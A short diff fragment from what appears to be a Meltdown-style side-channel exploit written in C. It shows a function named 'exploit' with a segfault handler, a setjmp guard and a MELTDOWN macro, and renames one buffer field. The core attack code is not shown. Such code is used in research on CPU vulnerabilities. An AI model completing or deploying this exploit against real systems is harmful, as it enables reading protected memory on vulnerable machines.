@@ -89,7 +89,7 @@ void segfault_handler(int signum) {
 
 size_t exploit(size_t address, int tries) {
     uint8_t *phys = (uint8_t *)address;
-    uint8_t *mem = buffer.array2;
+    uint8_t *mem = buffer.table;
     
     if (!setjmp(buf)) {
         MELTDOWN;
